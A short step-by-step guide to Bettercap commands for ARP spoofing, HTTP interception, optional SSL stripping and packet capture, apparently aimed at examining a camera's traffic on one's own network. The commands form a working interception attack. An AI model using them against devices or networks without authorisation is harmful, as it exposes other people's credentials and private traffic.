# Bettercap MITM Commands Guide

A simple step-by-step list of commands with clear descriptions, written plainly.

## 1. Install Bettercap
```
sudo apt update
sudo apt install bettercap
```
Description: Install Bettercap on your system.

## 2. Find your network interface
```
ip addr
```
Description: Find the name of your network interface (for example, eth0 or wlan0).

## 3. Start Bettercap on your interface
```
sudo bettercap -iface eth0
```
Description: Replace eth0 with your interface. This starts Bettercap.

## 4. Inside Bettercap: Discover devices
```
net.probe on
net.show
```
Description: Scan your network and show connected devices.

## 5. Set ARP spoofing target
```
set arp.spoof.targets 192.168.0.198
arp.spoof on
```
Description: Set your camera’s IP as the target and start ARP spoofing.

## 6. Enable HTTP proxy and sniffing
```
http.proxy on
net.sniff on
```
Description: Intercept HTTP traffic and sniff packets.

## 7. (Optional) Try to strip HTTPS
```
set http.proxy.sslstrip true
http.proxy on
```
Description: Try to downgrade HTTPS to HTTP if possible.

## 8. Save captured packets
```
set net.sniff.output capture.pcap
```
Description: Save the sniffed packets to a file.

## 9. Open Wireshark
```
sudo wireshark
```
Description: Run Wireshark to monitor traffic.

Use this display filter in Wireshark:
```
ip.addr == 192.168.0.198 && !(udp.port == 5353)
```
Description: Show only your camera’s traffic and ignore MDNS.

